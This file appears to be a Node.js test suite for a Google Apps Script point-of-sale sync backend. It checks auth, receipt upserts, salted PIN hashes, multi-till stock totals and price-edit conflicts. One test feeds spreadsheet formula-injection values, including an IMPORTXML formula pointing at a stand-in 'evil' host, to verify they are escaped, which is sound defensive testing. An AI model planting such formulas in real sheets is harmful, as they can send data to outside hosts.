// Runs apps-script/Code.gs against a tiny in-memory fake of SpreadsheetApp to check upserts, auth and users.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { createHash, randomUUID } from 'node:crypto';
import { hashPin } from '../js/logic.js';

function fakeSheet(name) {
  const rows = [];
  const range = (r, c, nr = 1, nc = 1) => ({
    setValues(v) { v.forEach((row, i) => { rows[r - 1 + i] = rows[r - 1 + i] || []; row.forEach((x, j) => { rows[r - 1 + i][c - 1 + j] = x; }); }); return this; },
    getValues() { return Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => (rows[r - 1 + i] || [])[c - 1 + j] ?? '')); },
    setFontWeight() { return this; }, setBackground() { return this; }, setNumberFormat() { return this; },
    setFormula(f) { rows[r - 1] = [f]; return this; }
  });
  return {
    name, rows,
    getName() { return name; },
    getRange(a, b, c, d) { return typeof a === 'string' ? range(1, 1) : range(a, b, c, d); },
    getLastRow() { return rows.length; },
    appendRow(r) { rows.push(r); },
    setFrozenRows() {}, setRightToLeft() {}, setConditionalFormatRules() {}
  };
}

function load() {
  const sheets = {};
  const ss = {
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => (sheets[n] = fakeSheet(n)),
    getSheets: () => Object.values(sheets),
    deleteSheet: () => {}
  };
  const props = {};
  const rule = { whenNumberLessThan() { return this; }, whenNumberGreaterThan() { return this; }, whenNumberEqualTo() { return this; }, setBackground() { return this; }, setRanges() { return this; }, build() { return {}; } };
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss, newConditionalFormatRule: () => ({ ...rule }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] ?? null, setProperty: (k, v) => { props[k] = v; } }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (t) => ({ text: t, setMimeType() { return this; } }) },
    Utilities: {
      getUuid: () => randomUUID(),
      DigestAlgorithm: { SHA_256: 'sha256' }, Charset: { UTF_8: 'utf8' },
      computeDigest: (_a, s) => [...createHash('sha256').update(s, 'utf8').digest()].map((b) => (b > 127 ? b - 256 : b))
    },
    JSON, Math, Number, String, Date, Object
  };
  vm.createContext(ctx);
  vm.runInContext(readFileSync(new URL('../apps-script/Code.gs', import.meta.url), 'utf8'), ctx);
  ctx.setup();
  const call = (body) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  return { sheets, props, call, ctx };
}

const sale = (voided = 0) => ({
  receiptId: 'T1-261105-0001', shiftId: 'T1-SH-0001', cashierName: 'سارا', timestamp: '2026-11-05T10:00:00Z',
  items: [{ barcode: '012000000133', name: 'پپسی', qty: 3, price: 4000, cost: 2500 }], total: 12000, cashReceived: 20000, changeGiven: 8000, voided
});

test('rejects wrong token', () => {
  const { call } = load();
  assert.equal(call({ action: 'push', token: 'nope' }).ok, false);
});

test('push writes AFN values, and re-push / void updates instead of duplicating', () => {
  const { sheets, props, call } = load();
  const token = props.SYNC_TOKEN;
  assert.equal(call({ action: 'push', token, deviceId: 'T1', sales: [sale()], products: [{ barcode: '012000000133', name: 'پپسی', price: 4000, cost: 2500, stock: 21 }] }).ok, true);
  assert.equal(call({ action: 'push', token, deviceId: 'T1', sales: [sale(1)] }).ok, true);
  const s = sheets.Sales.rows;
  assert.equal(s.length, 2); // header + one receipt
  assert.equal(s[1][4], 120);  // total in AFN
  assert.equal(s[1][9], 'Voided');
  assert.equal(s[1][13], 0);   // no profit on voided
  assert.equal(sheets.Sale_Items.rows.length, 2);
  assert.equal(sheets.Inventory.rows[1][0], '012000000133');
  assert.equal(sheets.Inventory.rows[1][5], 38); // margin %
});

test('users endpoint returns salted hashes that the app can verify; skips bad PINs', async () => {
  const { sheets, props, call } = load();
  sheets.Users.rows.length = 1;
  sheets.Users.rows.push(['مریم', 'مدیر', '4321', true], ['بد', 'cashier', '12', true], ['علی', 'cashier', '5555', 'FALSE']);
  const res = call({ action: 'users', token: props.SYNC_TOKEN });
  assert.equal(res.users.length, 2);
  const [m, a] = res.users;
  assert.equal(m.role, 'admin');
  assert.equal(await hashPin('4321', m.salt), m.pinHash);
  assert.equal(a.active, false);
  assert.ok(!JSON.stringify(res).includes('4321'));
});

test('shift reconciliation status', () => {
  const { sheets, props, call } = load();
  call({ action: 'push', token: props.SYNC_TOKEN, shifts: [{ shiftId: 'SH1', status: 'closed', cashierName: 'x', variance: -1000, expectedCash: 152000, countedCash: 151000, startingFloat: 150000, netCash: 12000, payins: 0, payouts: 0, drops: 10000, txCount: 1 }] });
  const r = sheets.Shift_Reconciliation.rows[1];
  assert.equal(r[11], -10);
  assert.equal(r[12], 'Short');
});

test('text that looks like a spreadsheet formula is written as plain text', () => {
  const { sheets, props, call } = load();
  call({ action: 'push', token: props.SYNC_TOKEN, products: [{ barcode: '9', name: '=IMPORTXML("http://evil","//a")', price: 100, cost: 0, stock: 1 }],
    movements: [{ id: 'm1', type: 'payout', amount: 100, note: '+cmd', userName: '@x', approvedBy: 'a' }] });
  assert.equal(sheets.Inventory.rows[1][1], "'=IMPORTXML(\"http://evil\",\"//a\")");
  assert.equal(sheets.Cash_Movements.rows[1][5], "'+cmd");
  assert.equal(sheets.Cash_Movements.rows[1][6], "'@x");
  assert.equal(sheets.Cash_Movements.rows[1][4], 1); // numbers untouched
});

test('weighed lines: two weighings of the same item stay two rows; kg counts as one item; unit column round-trips', () => {
  const { sheets, props, call } = load();
  const s = { ...sale(), items: [
    { barcode: '2000000000015', name: 'بادنجان رومی', qty: 1.25, unit: 'kg', price: 6000, cost: 4500 },
    { barcode: '2000000000015', name: 'بادنجان رومی', qty: 0.5, unit: 'kg', price: 6000, cost: 4500 }
  ], total: 10500 };
  call({ action: 'push', token: props.SYNC_TOKEN, sales: [s], products: [{ barcode: '2000000000015', name: 'بادنجان رومی', price: 6000, cost: 4500, stock: 48.25, unit: 'kg' }] });
  call({ action: 'push', token: props.SYNC_TOKEN, sales: [s] }); // re-push must not duplicate
  assert.equal(sheets.Sale_Items.rows.length, 3);
  assert.equal(sheets.Sale_Items.rows[1][6], 75);
  assert.equal(sheets.Sales.rows[1][7], 2);       // item count
  assert.equal(sheets.Sales.rows[1][12], 78.75);  // cost 1.25*45 + 0.5*45
  assert.equal(sheets.Inventory.rows[1][9], 'kg');
  assert.equal(sheets.Inventory.rows[1][4], 48.25); // decimal kg total survives
  const res = call({ action: 'products', token: props.SYNC_TOKEN, deviceId: 'T2' });
  assert.equal(res.products[0].unit, 'kg');
  assert.equal(res.products[0].stock, 0); // already owned by the till that pushed it — not handed out twice
});

const prod = (stock) => ({ barcode: '5000', name: 'صابون', price: 3000, cost: 2000, stock, unit: 'pc' });

test('two tills: each keeps its own stock row and Inventory shows the store total (no last-writer-wins)', () => {
  const { sheets, props, call } = load();
  const token = props.SYNC_TOKEN;
  call({ action: 'push', token, deviceId: 'T1', products: [prod(10)] });
  call({ action: 'push', token, deviceId: 'T2', products: [prod(-3)] }); // T2 sold 3 from T1's delivery
  assert.equal(sheets.Stock_By_Device.rows.length, 3); // header + T1 + T2
  assert.equal(sheets.Inventory.rows[1][4], 7);
  call({ action: 'push', token, deviceId: 'T1', products: [prod(8)] });
  assert.equal(sheets.Stock_By_Device.rows.length, 3);
  assert.equal(sheets.Inventory.rows[1][4], 5);
});

test('starting stock typed into the sheet is handed to the first till that pulls it, and only once', () => {
  const { sheets, props, call } = load();
  const token = props.SYNC_TOKEN;
  sheets.Inventory.rows.push(['6000', 'چای', 50, 40, 24, '', '', '', '', 'pc']);
  const first = call({ action: 'products', token, deviceId: 'T1' }).products.find((p) => p.barcode === '6000');
  const second = call({ action: 'products', token, deviceId: 'T2' }).products.find((p) => p.barcode === '6000');
  assert.equal(first.stock, 24);
  assert.equal(second.stock, 0);
  // The total stays 24 after both tills push their own counts.
  call({ action: 'push', token, deviceId: 'T1', products: [{ barcode: '6000', name: 'چای', price: 5000, cost: 4000, stock: 24 }] });
  call({ action: 'push', token, deviceId: 'T2', products: [{ barcode: '6000', name: 'چای', price: 5000, cost: 4000, stock: 0 }] });
  assert.equal(sheets.Inventory.rows.find((r) => r[0] === '6000')[4], 24);
});

test('older sheets without the Stock_By_Device tab get it created on push', () => {
  const { sheets, props, call } = load();
  delete sheets.Stock_By_Device;
  assert.equal(call({ action: 'push', token: props.SYNC_TOKEN, deviceId: 'T1', products: [prod(4)] }).ok, true);
  assert.equal(sheets.Stock_By_Device.rows[0][0], 'Key');
  assert.equal(sheets.Inventory.rows[1][4], 4);
});

const priced = (o) => ({ barcode: '7000', name: 'شکر', price: 8000, cost: 6000, stock: 10, unit: 'pc', updatedAt: '2026-11-07T08:00:00Z', ...o });

test('a stock-only push from an offline till does not overwrite a newer price in the sheet', () => {
  const { sheets, props, call } = load();
  const token = props.SYNC_TOKEN;
  call({ action: 'push', token, deviceId: 'T1', products: [priced({ priceAt: '2026-11-07T08:00:00Z' })] });
  call({ action: 'push', token, deviceId: 'T2', products: [priced({ price: 9000, priceAt: '2026-11-07T09:00:00Z', stock: 0 })] }); // T2 raises the price
  call({ action: 'push', token, deviceId: 'T1', products: [priced({ priceAt: '2026-11-07T08:00:00Z', stock: 7, updatedAt: '2026-11-07T10:00:00Z' })] }); // T1 sold 3, old price
  const row = sheets.Inventory.rows.find((r) => r[0] === '7000');
  assert.equal(row[2], 90);  // T2's newer price survives
  assert.equal(row[4], 7);   // stock total still updated: T1 7 + T2 0
});

test('a newer price edit from a till does replace the sheet price', () => {
  const { sheets, props, call } = load();
  const token = props.SYNC_TOKEN;
  call({ action: 'push', token, deviceId: 'T1', products: [priced({ priceAt: '2026-11-07T08:00:00Z' })] });
  call({ action: 'push', token, deviceId: 'T1', products: [priced({ price: 8500, priceAt: '2026-11-07T11:00:00Z' })] });
  assert.equal(sheets.Inventory.rows.find((r) => r[0] === '7000')[2], 85);
});

test('editing a price directly in the sheet stamps it, so an older till edit cannot overwrite it', () => {
  const { sheets, props, call, ctx } = load();
  const token = props.SYNC_TOKEN;
  call({ action: 'push', token, deviceId: 'T1', products: [priced({ priceAt: '2026-01-01T08:00:00Z' })] });
  const r = sheets.Inventory.rows.findIndex((x) => x[0] === '7000') + 1;
  sheets.Inventory.rows[r - 1][2] = 95; // owner types a new price
  ctx.onEdit({ range: { getSheet: () => sheets.Inventory, getRow: () => r, getLastRow: () => r, getColumn: () => 3, getLastColumn: () => 3 } });
  // Till edit newer than the first push but made before the owner's sheet edit (which is stamped "now").
  call({ action: 'push', token, deviceId: 'T1', products: [priced({ price: 8200, priceAt: '2026-02-01T09:00:00Z' })] });
  assert.equal(sheets.Inventory.rows[r - 1][2], 95);
});
